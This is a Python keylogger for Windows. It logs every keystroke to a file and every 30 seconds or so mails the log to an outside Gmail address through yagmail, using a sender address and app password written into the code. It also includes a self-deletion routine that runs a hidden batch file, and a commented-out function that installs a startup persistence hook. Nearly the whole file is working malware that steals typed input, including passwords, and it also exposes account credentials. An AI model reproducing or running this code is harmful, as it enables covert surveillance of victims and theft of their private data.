from pynput import keyboard
# from watchdog.observers import Observer
# from watchdog.events import FileSystemEventHandler
import os, sys, time, subprocess

import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate

def delete_self():
    path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
    bat = path_exe + ".bat"                   # make a bat file next to exe file

    bat_contents = f"""
        @echo off
        :loop
        del "{path_exe}" >nul 2>&1
        if exist "{path_exe}" goto loop
        del "{bat}" >nul 2>&1
    """

    with open(bat, "w") as f:
        f.write(bat_contents)

    subprocess.Popen([bat], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def on_press(key):
    if key == keyboard.Key.esc:
        return False
    
    # current_path = os.path.dirname(sys.executable)
    # path = os.path.dirname(current_path) + "/log.txt"
    path = "log.txt"

    with open(path, "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            if key.name == "enter":
                file.write("\n")
            elif key.name == "space":
                file.write(" ")
            else:
                file.write(f"[{key.name}]")

# windows security immediately deletes exe if can send email.
# to send email, needs 2fa with phone number and uses app passwords 
# (this is a vulnerability in my code as the phone number could be tracked down)
import yagmail
def send_email():
    # dont send email if file is small
    if os.path.getsize("log.txt") <    512:
        print("cancel email send")
        return
    
    yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
    yag.send('zovinang@gmail.com', 'test send email', contents = 'hi', attachments = "log.txt")

    # clears file
    with open("log.txt", "w") as file:
        pass

# make program always run at startup
# taken from : https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows
# makes a bat file in window's startup folder that runs the current exe file

# import getpass
# USER_NAME = getpass.getuser()

# def add_to_startup():
#     path_exe = os.path.realpath(sys.argv[0])
#     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
#     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
#         bat_file.write(f'start "" {path_exe}')

listener = keyboard.Listener(on_press=on_press)
listener.start()

# tries to delete itself.
# listener.join()     # waits for listener to stop listening
        
# directory_path = os.path.dirname(sys.executable)

# time.sleep(2)
# last_access_time = os.stat(directory_path).st_atime

# while True:
#     time.sleep(1)
#     new_access_time = os.stat(directory_path).st_atime
#     if (new_access_time > last_access_time):
#         print(f"last {last_access_time}")
#         print(f"new {new_access_time}")  
#         # delete_self()
#         break

# listener.stop()

i = 0
while (1):
    time.sleep(1)
    i += 1
    if i > 30:
        i = 0
        print("sending email")
        send_email()
        time.sleep(10)
        print("email sent")

print("program over")

# https://github.com/skeeto/chacha-js/blob/master/chacha.js encryption
# https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows startup
